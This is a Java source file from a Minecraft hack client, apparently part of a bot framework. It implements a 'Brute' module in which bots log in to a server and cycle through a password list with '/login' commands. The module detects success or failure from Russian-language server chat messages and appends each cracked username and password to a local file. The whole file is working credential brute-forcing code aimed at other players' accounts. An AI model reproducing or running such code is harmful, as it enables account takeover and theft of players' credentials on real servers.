package hack.rawfish2d.client.pbots.modules;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.concurrent.CopyOnWriteArrayList;

import hack.rawfish2d.client.cmd.PBotCmd;
import hack.rawfish2d.client.pbots.PBotThread;
import hack.rawfish2d.client.pbots.utils.PBotVar;
import hack.rawfish2d.client.utils.ConfigManager;
import hack.rawfish2d.client.utils.MiscUtils;
import hack.rawfish2d.client.utils.TimeHelper;
import net.minecraft.src.Packet;
import net.minecraft.src.Packet13PlayerLookMove;
import net.minecraft.src.Packet16BlockItemSwitch;
import net.minecraft.src.Packet205ClientCommand;
import net.minecraft.src.Packet3Chat;

public class Brute extends ModuleBase {
	private static PBotVar gToggled = new PBotVar("Brute", "gToggled", false);
	private static PBotVar pls_login1 = new PBotVar("Brute", "pls_login1", "Авторизуйтесь".toLowerCase());
	private static PBotVar pls_login2 = new PBotVar("Brute", "pls_login2", "/login".toLowerCase());
	private static PBotVar pls_login3 = new PBotVar("Brute", "pls_login3", "Для входа в игру введите команду:".toLowerCase());
	private static PBotVar wrong_pass = new PBotVar("Brute", "wrong_pass", "Вы ввели неправильный пароль. Попробуйте ещё раз.".toLowerCase());
	private static PBotVar login_ok = new PBotVar("Brute", "login_ok", "Вы зашли на свой аккаунт, удачной вам игры!".toLowerCase());
	private TimeHelper time;
	private TimeHelper timeKick;
	private int kickCount = 0;
	
	public static CopyOnWriteArrayList<String> passwords = new CopyOnWriteArrayList<String>();
	public static CopyOnWriteArrayList<BruteData> data = new CopyOnWriteArrayList<BruteData>();
	
	public Brute(PBotThread bot) {
		super(bot, "Brute");
		toggled = gToggled.get(false);
		time = new TimeHelper();
		timeKick = new TimeHelper();
	}
	
	@Override
	public void onEnable() {}
	
	@Override
	public void onDisable() {}
	
	@Override
	public void onReadPacket(Packet packet) {
		if(!toggled) {
			return;
		}
		
		if(packet instanceof Packet3Chat) {
			Packet3Chat p = (Packet3Chat)packet;
			//if(p.message.contains("§eАвторизуйтесь §7-") && p.message.contains("§b/login §8[§dпароль§8]") || p.message.contains("§e§eДля входа в игру введите команду:")) { //§eАвторизуйтесь §7- §b/login §8[§dпароль§8]
			
			String message = p.message.toLowerCase();
			
			/*
			if(bot.instance.name.equalsIgnoreCase("eminasubi")) {
				bot.sendChatClient(message);
			}
			*/
			
			if(message.contains(login_ok.get(""))) {
				bot.loggined = true;
				String pass = passwords.get(bot.BruteIndex);
				//bot.sendChatClient("§a§lBot " + bot.instance.name + " §dВерный пароль! §e§l:" + pass);
				bot.sendChatClient("§eBot §8[§a" + bot.instance.name + "§8] " + "§dВерный пароль! §e§l:" + pass);
				data.add(new BruteData(bot.instance.name, pass));
				
				try {
					ConfigManager.createFile(ConfigManager.dirname + "//" + "brute_done.txt");
					Files.write(Paths.get(ConfigManager.dirname + "//" + "brute_done.txt"), (bot.instance.name + ":" + pass + "\r\n").getBytes(), StandardOpenOption.APPEND);
				}
				catch (Exception ex) {
					ex.printStackTrace();
					bot.sendChatClient("§c§lERROR!");
				}
				
				bot.delBot();
			}
			
			if(message.contains(wrong_pass.get("")) && !bot.loggined) {
				//bot.sendChatClient("§a§lBot " + bot.instance.name + " неверный пароль!");
				if(bot.BruteIndex < passwords.size() - 1) {
					bot.BruteIndex++;
				}
				else {
					bot.BruteIndex = 0;
					bot.delBot();
				}
			}
		}
	}
	
	private void login() {
		String pass = passwords.get(bot.BruteIndex);
		
		if(pass.equalsIgnoreCase("[player]")) {
			pass = pass.replaceAll("\\[player]", bot.instance.name);
		}
		
		bot.sendPacket(new Packet205ClientCommand(1));
		MiscUtils.sleep(6L);
		bot.sendPacket(new Packet3Chat("/login " + pass));
		MiscUtils.sleep(6L);
		//bot.sendChatClient("§eBot §8[§a" + bot.instance.name + "§8] " + "- §e§l/login " + pass);
		bot.sendChatClient("§eBot §8[§a" + bot.instance.name + "§8] " + "- §e§lindex: " + bot.BruteIndex);
		//bot.BruteIndex = 3480;
		//3480
	}
	
	@Override
	public void onTick() {
		if(!toggled) {
			return;
		}
		
		if(kickCount == 5) {
			bot.delBot();
			return;
		}
		
		if(timeKick.hasReached(1000)) {
			timeKick.reset();
			
			if(!bot.ready)
				kickCount++;
			else
				kickCount = 0;
		}
		
		if(bot.inLobby && time.hasReached(1001L)) {
			login();
			time.reset();
		}
	}
	
	private class BruteData {
		public String name;
		public String pass;
		
		public BruteData() {}
		
		public BruteData(String name, String pass) {
			this.name = name;
			this.pass = pass;
		}
	}
}
